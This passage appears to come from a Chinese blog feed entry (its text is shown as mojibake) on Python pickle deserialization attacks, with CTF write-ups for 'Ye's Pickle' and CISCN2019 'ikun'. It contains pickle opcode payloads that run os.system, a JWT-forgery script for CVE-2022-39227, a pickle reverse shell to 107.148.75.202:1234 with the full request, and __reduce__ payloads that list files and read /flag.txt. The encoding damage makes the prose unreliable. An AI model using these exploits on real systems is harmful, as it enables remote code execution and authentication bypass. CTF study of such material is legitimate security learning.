ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td></tr><tr><td align="left">u</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td align="left">u</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td></tr><tr><td align="left">a</td><td align="left">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td align="left">a</td><td align="left">æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td></tr><tr><td align="left">e</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td align="left">e</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td></tr></tbody></table><h2 id="å‡½æ•°æ‰§è¡Œopcodeæ„é€ "><a href="#å‡½æ•°æ‰§è¡Œopcodeæ„é€ " class="headerlink" title="å‡½æ•°æ‰§è¡Œopcodeæ„é€ "></a>å‡½æ•°æ‰§è¡Œopcodeæ„é€ </h2><p><code>R</code> :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos      # ä½¿ç”¨cæ¥import osæ¨¡å—</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;   # (å‹å…¥markæ ‡è®°   Så®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</span><br><span class="line">tR.&#x27;&#x27;&#x27; # å¯»æ‰¾ä¸Šä¸€ä¸ªmarkæ ‡è®°å¹¶å°†ä¹‹é—´çš„æ•°æ®åˆå¹¶ä¸ºä¸€ä¸ªå…ƒç»„ å³(&#x27;whoami&#x27;,)</span><br><span class="line"> # Ré€‰æ‹©ç¬¬ä¸€ä¸ªå¯¹è±¡ä¸ºå‡½æ•°,ç¬¬äºŒä¸ªå¯¹è±¡ä¸ºå‚æ•° å³os.system(&#x27;whoami&#x27;,)</span><br></pre></td></tr></table></figure><p><code>o</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos  # ä½¿ç”¨cæ¥import osæ¨¡å—</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27; # Så®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</span><br><span class="line">o.&#x27;&#x27;&#x27;  # oå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰å³ os.system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p><code>i</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;  # (å‹å…¥markæ ‡è®°   Så®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</span><br><span class="line">ios# iç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ¬è¿ä¸¤å¼ PVMè§£æopcodeçš„åŠ¨å›¾æ¼”ç¤º</p><ul><li>PVMè§£æ <code>str</code> çš„è¿‡ç¨‹</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230631-6204866e-6abc-1.gif"></p><ul><li>PVMè§£æ <code>__reduce__()</code> çš„è¿‡ç¨‹</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230711-7972c0ea-6abc-1.gif"></p><h2 id="Pkerå·¥å…·"><a href="#Pkerå·¥å…·" class="headerlink" title="Pkerå·¥å…·"></a>Pkerå·¥å…·</h2><p><a href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p><p>ä½¿ç”¨è„šæœ¬æ¥ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„opcode</p><h2 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹:"></a>æ¡ˆä¾‹:</h2><h3 id="New-star-2023-Yeâ€™s-Pickle"><a href="#New-star-2023-Yeâ€™s-Pickle" class="headerlink" title="New star 2023 Yeâ€™s Pickle"></a>New star 2023 Yeâ€™s Pickle</h3><p>é¢˜ç›®ç»™å‡ºäº†é™„ä»¶</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># åŒ…å«å­—æ¯å’Œæ•°å­—</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä¼šè¿”å›ä¸€ä¸ªjwt token è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªcveçš„åˆ©ç”¨</p><p>CVE-2022-39227</p><p>ç›´æ¥ç”¨ç½‘ä¸Šçš„åˆ©ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_encode, base64url_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    <span class="built_in">print</span>(parsed_payload)</span><br><span class="line">    parsed_payload[<span class="string">&quot;role&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)))</span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="built_in">print</span>(fake_payload)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(topic(<span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA5MjEsImlhdCI6MTcwOTEzNzMyMSwianRpIjoic0t1bEt5Q0VJSXFORDN2R3pKeGVqdyIsIm5iZiI6MTcwOTEzNzMyMSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.OfLoye4xwPW_8a7iakPPOXc9ki4EcbfTMG4Swm0Bo_9p6Wv5ZM0hGimwUKgweMNEsnUl6xXi47QIEaUSc2tS2CIchYHJs3quH0odaQoxlulyE3IOYh0-NzQfTymeqsmbejweyEQ1FiRjKyBgVNFL7eZa8ESp_2CIzeYmCmaaTjDfwVhgm7O6wTfwVoX4qjtPitQ-NWaSQ3lwQtXyveOGx3mqWiWY2d_STalqDv3bnUNyOkxXywkOpYM-OtVzY48lTD7m3BQTHLQ93C_3QYOHk_KzMDitnsekdC3gw3eDYdiVq8BruDgXrKHK7lxVBvvVFRv-NIwoO-E7wK1ukzC0gg&#x27;</span>))</span><br></pre></td></tr></table></figure><p>å°†ç»“æœä½œä¸ºå‚æ•°tokençš„å€¼,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?token=&#123;&quot; eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&quot;, &quot;payload&quot;:&quot;eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9&quot;,&quot;signature&quot;:&quot;OXsPZvXsGqKReQFv9FMYwneKop1D757MA1WmPG4IsOze9An4tQtDGu3zycahr6EL0Xn-rcToH0hGyH4i9dt3jnWPxNTrqR1QRIclAOeGinN9wBnxyECNZf8_0gBGhazgvSdB2lHwLsuVoR2mSMndPhCMz9oJPATVqmpfhveYiT9N7uGTUJbbrXXaEF3BPU2T0vOChhDmqZGUw93qy5lIkxMhnSa6plSPovDdBv1aUKmWoGmy_TRAkFesL1NKjv7Wi0QjdcUge96Fv3mmqMp9_G-iafz7u9Ot-YyJ9VsOGqi_vBov6fTFZnJSzAwv49DgIeuVxa2sKtzR8970nk_owg&quot;&#125;</span><br></pre></td></tr></table></figure><p>ä¼šè¿”å›ä¸€ä¸ªsession, å°±æ˜¯adminçš„session</p><p>æ­¤æ—¶å°±å¯ä»¥å–pickleè¿™ä¸ªè·¯ç”±ä¸‹è¿›è¡Œpickle</p><p>è¿™é‡Œä¸ä¼šå›æ˜¾, å› æ­¤éœ€è¦ä½¿ç”¨opcodeæ„é€ ä¸€ä¸ªåå¼¹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/107.148.75.202/1234 0&gt;&amp;1\&quot;&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = base64.b64encode(opcode)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>bâ€™Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg&#x3D;&#x3D;â€™</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pickle?pickle=Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg==</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>300e864c-da01-4bab-9750-6b5949530b2c.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJyb2xlIjoiYWRtaW4ifQ.Zd9egg.OdEGNtZQIeC9-nt3MzZmcX_uDRY</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229004733728.png" alt="image-20240229004733728"></p><p>å¾—åˆ°flag</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>è¿›å»åå¯ä»¥æ³¨å†Œç™»å½•, è¿™äº›åœ°æ–¹éƒ½æµ‹ä¸å‡ºä»€ä¹ˆæ¼æ´</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229133317018.png" alt="image-20240229133317018"></p><p>çœ‹äº†åŠå¤©, è¿™é‡Œè¦æ±‚ä¹°åˆ°lv6, ç¿»äº†å‡ é¡µéƒ½æ²¡æœ‰lv6, åœ¨static&#x2F;imgç›®å½•ä¸‹lv6.pngç¡®å®å­˜åœ¨. è¿™é‡Œéœ€è¦ç”¨pythonè„šæœ¬è·‘ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://e1b204f5-1beb-46b5-bf6b-9362c6510dfe.node5.buuoj.cn:81/shop?page=&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url=url.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">   <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°lv6.pngåœ¨page&#x3D;181</p><p>ä¹‹åæ˜¯ä¿®æ”¹æŠ˜æ‰£ä¿¡æ¯æ¥è´­ä¹°</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160429059.png" alt="image-20240229160429059"></p><p>å°†dicountä¿®æ”¹ä¸ºä¸€ä¸ªå¾ˆå°çš„æ•°</p><p>è®¿é—®è¿”å›çš„&#x2F;b1g_m4mberæç¤ºéœ€è¦admin, è¿™é‡Œç”¨<a href="https://jwt.io/">https://jwt.io/</a> å’Œc-jwt-cracker æ¥ä¼ªé€ jwt</p><p>jwt ç§é’¥ç ´è§£</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229150958381.png" alt="image-20240229150958381"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160701863.png" alt="image-20240229160701863"></p><p>ä¹‹åå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç½‘ç«™å¤‡ä»½</p><p>æ¶‰åŠpickleçš„æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (os.listdir,(<span class="string">&quot;/&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦åœ¨python2ç¯å¢ƒä¸‹è¿›è¡Œ, python3é‡Œç”Ÿæˆçš„payloadå¹¶ä¸å¥æ•ˆ</p><p>è¿™é‡Œå¹¶ä¸èƒ½ä½¿ç”¨os.systemæ¥æ‰§è¡Œå‘½ä»¤, ä¸çŸ¥é“ä¸ºä»€ä¹ˆ..</p><p>ç”Ÿæˆpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160938342.png" alt="image-20240229160938342"></p><p>è¯»å–flag.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;rb&#x27;).read()&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229161110656.png" alt="image-20240229161110656"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pickleååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#pickleååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;pickleååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;pickleååºåˆ—åŒ–&lt;/h1&gt;&lt;p&gt;åœ¨pyhtonä¸­ä¹Ÿå­˜åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ“ä½œ, ç”±pickleæ¨¡å—å®ç°&lt;/p</summary>
      
    
    
    
    
    <category term="pickleååºåˆ—åŒ–" scheme="http://example.com/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)</title>
    <link href="http://example.com/2024/02/27/Python-%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    <id>http://example.com/2024/02/27/Python-%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/</id>
    <published>2024-02-27T15:24:04.000Z</published>
    <updated>2024-02-29T14:43:35.791Z</updated>
    
